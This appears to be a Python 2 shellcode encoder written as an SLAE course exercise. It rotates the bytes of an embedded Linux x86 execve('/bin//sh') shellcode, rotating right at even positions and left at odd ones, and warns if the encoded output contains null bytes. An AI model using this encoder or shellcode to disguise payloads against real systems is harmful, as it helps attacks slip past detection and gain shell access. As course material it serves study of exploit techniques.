#!/usr/bin/python
# Python Custom Encoding eRORoROL (Even inedx ROR, Odd index ROL)
# Author:   Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
# SLAE-461
# v0.1
# Description:  If index number is Even do a ROR, else do a ROL 


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

format_slash_x = ""
format_0x = ""
counter = 0

max_bits = 8 
offset = 1

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
 
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

print "Shellcode encryption started ..."

for x in bytearray(shellcode):
  #go through all hexadecimal values
  counter += 1   
  print "[i] Counter: "+str(counter)
  print "[i] Instruction in hex: "+ hex(x)
  print "[i] Instruction in decimal: "+ str(x)
  
  if counter%2==0:  #check if index number is odd or even
    print "[i] EVEN index, therefore do ROR"
    rox_encoded_instruction = ror(x, offset, max_bits)
  else:
    print "[i] ODD index therefore do ROL"
    rox_encoded_instruction = rol(x, offset, max_bits)

  encoded_instruction_in_hex = '%02x' % rox_encoded_instruction
  print "[i] Encoded instruction in hex: "+encoded_instruction_in_hex +"\n"

  #Beautify with 0x and comma
  format_0x += '0x'
  format_0x += encoded_instruction_in_hex+","


print "\n[+] Shellcode custom encoding done"
print "\n[i] Initial shellcode length: %d" % len(bytearray(shellcode))
length_format_0x = format_0x.count(',') 
print "[i] Encoded format 0x Length: %d" % length_format_0x
print "[i] Encoded format 0x:\t"+ format_0x 

if "0x0," in format_0x:  print "\n[!] :( WARNING: Output shellcode contains NULL byte(s), consider re-encoding with different offset."
else: print "\n[i] :) Cool, no NULL bytes detected in output"

print "\n[i] Done!"
